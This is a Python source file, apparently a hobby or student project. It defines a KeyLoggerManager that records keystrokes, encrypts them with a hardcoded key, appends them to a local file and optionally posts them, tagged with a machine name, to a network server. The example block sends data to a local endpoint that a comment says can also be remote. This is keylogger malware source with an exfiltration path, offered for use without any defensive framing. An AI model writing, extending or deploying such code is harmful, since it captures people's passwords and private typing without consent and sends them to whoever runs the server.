from KeyLoggerService import KeyLogger
from fileWriter import MyFile
from network_writer import NetworkWriter
from Encryption import Crypto
import json

class KeyLoggerManager:
    def __init__(self, file_path="encrypt.txt", network_url=None, crypto_key="abcdefjhijklmnopqrstuvwxyz"):
        self.logger = KeyLogger()
        self.crypto = Crypto(crypto_key)

        # Writer file
        self.file = MyFile(file_path)

        # Writer network (option)
        if network_url:
            self.network_writer = NetworkWriter(network_url, self.crypto)
        else:
            self.network_writer = None

    def start_logger(self):
        self.logger.start_logging()

    def stop_logger(self, machine_name="Machine_01"):
        self.logger.stop_logging()
        data = str(self.logger.get_logged_keys())

        # Encryption
        encrypted_data = self.crypto.process(data)

        # Write to file
        with open(self.file.file_name, "a") as f:
            f.write(json.dumps(encrypted_data) + "\n")  # une ligne par session

        # send to network
        if self.network_writer:
            self.network_writer.send_data(data, machine_name)


# - example---
if __name__ == "__main__":
    # for use only the file :
    # manager = KeyLoggerManager(file_path="encrypt.txt")

    # for use file + network :
    manager = KeyLoggerManager(
        file_path="encrypt.txt",
        network_url="http://127.0.0.1:5000/post"  # serveur local ou distant
    )

    manager.start_logger()
    manager.stop_logger("Machine_01")

    print("File :", manager.file.file_name)
    print("File contain :", manager.file.read_file())

